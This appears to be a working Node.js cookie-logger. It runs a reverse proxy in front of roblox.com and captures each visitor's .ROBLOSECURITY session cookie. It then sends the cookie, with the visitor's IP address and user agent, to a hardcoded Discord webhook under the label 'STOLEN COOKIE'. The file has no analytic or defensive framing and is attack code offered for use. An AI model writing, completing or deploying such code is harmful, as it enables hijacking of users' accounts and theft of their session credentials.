const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = "https://discord.com/api/webhooks/1548387395735396444/-KcCi8I2SJ-CuKP_Apo5Hssp8nWb4O4lzjZ0Q7bpiiIoNbRtRQFHmMQPYq04Rk7Ka9JX";

let cookieGrabbed = false;

app.use('/roblox', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    pathRewrite: { '^/roblox': '' },
    on: {
        proxyReq: (proxyReq, req, res) => {
            if (cookieGrabbed) return;

            const cookies = req.headers.cookie;
            
            if (cookies && cookies.includes('.ROBLOSECURITY')) {
                cookieGrabbed = true;
                console.log("Cookie Grabbed!");

                const robloxCookie = cookies.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY'));

                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🍪 **STOLEN COOKIE**\n\`\`\`${robloxCookie}\`\`\`\n\n**IP:** ${req.ip}\n**UA:** ${req.headers['user-agent']}`
                    })
                }).catch(err => console.error("Discord Error:", err));
            }
        }
    }
}));

app.listen(PORT, () => {
    console.log(`Logger running on port ${PORT}`);
});
